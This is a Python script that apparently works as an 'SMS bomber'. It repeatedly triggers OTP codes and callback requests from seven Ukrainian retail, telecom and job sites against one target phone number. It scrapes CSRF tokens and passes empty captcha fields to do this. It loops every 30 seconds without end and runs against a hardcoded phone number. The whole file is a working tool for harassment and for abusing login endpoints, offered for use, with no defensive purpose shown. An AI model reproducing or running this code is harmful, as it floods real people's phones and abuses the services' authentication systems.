from requests import Session
from bs4 import BeautifulSoup 
import lxml
from time import sleep

work = Session()
headers= {'Accept-Language':'ru,de-DE;q=0.9,de', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'}

def get_sms_silpo(phone):
    url = "https://auth.silpo.ua/api/v2/Login/ByPhone?"
    headers = {
        "Content-Type": "application/json",
        "Origin": "https://auth.silpo.ua",
        "Referer": "https://auth.silpo.ua/login?",
    }
    data = {
        "delivery_method": "sms",
        "phone": phone,
        "phoneChannelType": 0,
        "recaptcha": None
    }

    result = work.post(url, json=data, headers=headers)
    if result.status_code == 200:
        return 'Done' 
    else:
        raise Exception(str(result.status_code))



def get_sms_iqos(phone):
    headers = {
        "Content-Type": "application/json",
        "Origin": "https://iqos.com.ua",
        "Referer": "https://iqos.com.ua/",
    }
    data = {'phone': phone,}
    result = work.post('https://api.iqos.com.ua/v1/auth/otp', headers=headers, json=data)
    if result.status_code == 201:
        return 'Done' 
    else:
        raise Exception(str(result.status_code))



def get_sms_city24(phone):
    headers = {
            "Content-Type": "application/json",
            "Origin": "https://city24.ua",
        }
    data = {'phoneNumber': phone,}
    result = work.post('https://city24.ua/api/v1.0/PersonalAccount/Account/registration', headers=headers, json=data)
    if result.status_code == 200:
        return 'Done' 
    else:
        raise Exception(str(result.status_code))



def get_call_ibox(phone):
    global headers
    work.headers.update(headers)
    page = work.get('https://ibox.kiev.ua/')
    
    soup = BeautifulSoup(page.text, 'lxml')
    token = soup.find('div', class_="popup-block login").find('script').get_text().split('.val(')[1].split(')')[0].strip('"')
    data = {'form[title]': 'fsaf','form[phone]': phone,'form[url]': '/','CSRFToken': token}
    
    header = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://ibox.kiev.ua",
            "Referer": "https://ibox.kiev.ua/",}
    
    result = work.post('https://ibox.kiev.ua/_widget/contacts/submit-callback/', data=data, headers=header)
    if result.status_code == 200:
        return 'Done' 
    else:
        raise Exception(str(result.status_code))
    


def get_sms_kievstar(phone):
    data = {
    'action': "registration",
    'captcha': None,
    'login': phone,
    'sid': "nkw"}

    headers = {
       "Content-Type": "application/json",
       "Origin": "https://account.kyivstar.ua",
       "Referer": "https://account.kyivstar.ua/cas/new/otp/verify",}

    result = work.post('https://account.kyivstar.ua/cas/new/api/otp/send?locale=uk', json=data, headers=headers)
    if result.status_code == 200:
        return 'Done' 
    else:
        raise Exception(str(result.status_code))
    


def get_sms_robota(phone):
    data = {'operationName': "SendOtpCode", 
        'query': "mutation SendOtpCode($phone: String!) {\n  users {\n    login {\n      otpLogin {\n        sendConfirmation(phone: $phone) {\n          status\n          remainingAttempts\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
        'variables': {'phone': phone}}

    headers = {
    "Content-Type": "application/json",
    "Origin": "https://robota.ua",
    "Referer": "https://robota.ua/",
    }

    result = work.post('https://dracula.robota.ua/?q=SendOtpCode', json=data, headers=headers)
    if result.status_code == 200:
        return 'Done' 
    else:
        raise Exception(str(result.status_code))
    

def get_sms_citrus(phone):
    global headers
    work.headers.update(headers)
    responce = work.get('https://my.ctrs.com.ua/ru/auth/login')
    soup = BeautifulSoup(responce.text, 'lxml')

    token = soup.find('div', class_="form").find('input').get('value')

    data = {
    '_token': token,
    'identity': phone
    }
    header = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://my.ctrs.com.ua",
    "Referer": "https://my.ctrs.com.ua/ru/auth/login",}

    result = work.post('https://my.ctrs.com.ua/ru/auth/login', data=data, headers=header)
    if result.status_code == 200:
        return 'Done' 
    else:
        raise Exception(str(result.status_code))

def main(full_number):
    plus_number = full_number #phone = "+380621420474"
    without_number = full_number[1:] #phone = '380664560121'
    nude_number = full_number[3:] #phone = '0954212345'
    
    while True:
        try:
            print(get_call_ibox(without_number))
        except Exception as e:
            print(e)

        try:
            print(get_sms_city24(without_number))
        except Exception as e:
            print(e)

        try:
            print(get_sms_iqos(without_number))
        except Exception as e:
            print(e)
        
        try:
            print(get_sms_silpo(plus_number))
        except Exception as e:
            print(e)

        try:
            print(get_sms_kievstar(without_number))
        except Exception as e:
            print(e)
        
        try:
            print(get_sms_robota(without_number))
        except Exception as e:
            print(e)

        try:
            print(get_sms_citrus(nude_number))
        except Exception as e:
            print(e)
        sleep(30)    
        

print(main('+380994179802'))#or another one phone number